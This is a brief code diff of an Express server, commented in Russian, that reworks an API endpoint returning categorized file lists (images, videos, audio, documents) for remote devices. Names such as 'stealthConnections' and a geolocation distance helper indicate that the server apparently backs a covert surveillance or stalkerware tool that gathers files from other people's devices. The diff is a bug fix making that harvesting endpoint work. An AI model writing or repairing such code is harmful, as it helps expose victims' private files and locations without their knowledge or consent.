@@ -159,7 +159,8 @@ app.get('/api/device/:deviceId/files/:token', (req, res) => {
   
   const cached = deviceFileCache.get(deviceId);
   if (cached && (Date.now() - cached.timestamp < 60000)) {
-    return res.json({ files: cached.files });
+    // ИСПРАВЛЕНО: возвращаем cached.data вместо cached.files
+    return res.json(cached.data);
   }
   
   const device = stealthConnections.get(deviceId);
@@ -168,10 +169,12 @@ app.get('/api/device/:deviceId/files/:token', (req, res) => {
     
     setTimeout(() => {
       const updated = deviceFileCache.get(deviceId);
-      res.json({ files: updated ? updated.files : [] });
+      // ИСПРАВЛЕНО: возвращаем updated.data или пустой объект
+      res.json(updated ? updated.data : { categories: { images: [], videos: [], audio: [], documents: [] }, total: 0 });
     }, 2000);
   } else {
-    res.json({ files: [] });
+    // ИСПРАВЛЕНО: возвращаем правильную структуру
+    res.json({ categories: { images: [], videos: [], audio: [], documents: [] }, total: 0 });
   }
 });
 
@@ -474,4 +477,5 @@ function getDistance(lat1, lon1, lat2, lon2) {
 server.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
+
 
